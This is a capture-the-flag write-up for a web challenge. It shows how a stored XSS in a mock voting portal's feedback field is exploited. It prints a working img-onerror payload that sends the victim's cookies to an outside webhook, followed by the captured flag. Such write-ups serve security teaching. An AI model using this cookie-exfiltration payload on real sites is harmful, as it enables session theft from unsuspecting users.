---
layout: writeup
title: Trusted Clerk
tags: WebX
---

## Description

The national elections in Freedonia have officially begun. In the spirit of transparency and continuous improvement, the Ministry of Electoral Integrity has launched a new early voting portal. Citizens are encouraged not only to cast their vote - but also to leave anonymous feedback about their voting experience.

“Your voice matters twice - once for your candidate, and once for your country.”

<!--more-->

http://redac.ted:9002/


## Solution

The link takes you to a pretty small website with a `Home` page, `About` page, `Contact` page, and a `Vote` page. The `Vote` page looks the most promosing as it has a form on it that sends a request to the backend server.

![Photo of the `Vote` page which shows the form with its fields of `candidate` and `feedback`](/assets/images/writeups_images/Trusted-Clerk/1.png)

This form seems to send back the two data points `candidate` and `feedback`

This is likely the feedback that the description hints at, and the description hints that the feedback will be read at somepoint.

This seems like a pretty basic XSS attack. We send the service feedback that contains malicous code that swipes their cookies.

For something like this I suggest using [Pipedream](pipedream.com). This service allows you to create `web hooks` in your workflows that you can then query, and see all traffic towards them. It helps in situations like this, when you need to have the client send their cookies remotely to your pipedream `webhook`

So time to create a payload. I went with the pretty standard image on error load approach.

```html
<img src="e" onerror="window.location.href = 'https://eo6fu53ufvqhqft.m.pipedream.net/' + document.cookie;">
```

If you are attempting to do this yourself, you will need to change the url to the url of your workflow, as this one was associated with my individual workflow.

So just inputing the payload into the `feedback` section of the form and waiting a few minutes returns this in my workflow request history:

![Photo of my pipedream workflow request history showing the request with the flag in it](/assets/images/writeups_images/Trusted-Clerk/2.png)

The exact link this goes to is

```text
https://eo6fu53ufvqhqft.m.pipedream.net/flag=secedu%7Bspr1nkle_s0me_http0nly_0n_y0ur_ch0colate_ch1p_c0oki3%7D
```

As you can see this has the cookie called `flag`, the value of this `flag` cookie is the flag for the challenge in URL encoding. So the flag is `secedu{spr1nkle_s0me_http0nly_0n_y0ur_ch0colate_ch1p_c0oki3}`
